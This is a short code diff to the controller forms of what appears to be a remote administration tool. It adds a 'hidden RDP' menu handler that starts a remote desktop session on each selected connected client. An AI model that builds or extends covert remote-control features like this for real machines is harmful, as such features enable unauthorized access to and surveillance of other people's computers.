@@ -741,6 +741,13 @@ namespace xServer.Forms
             }
         }
 
+        private void hiddenRDPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                CommandHandler.HandleRemoteDesktopProtocol(c);
+            }
+        }
         #endregion
 
         #region "Miscellaneous"
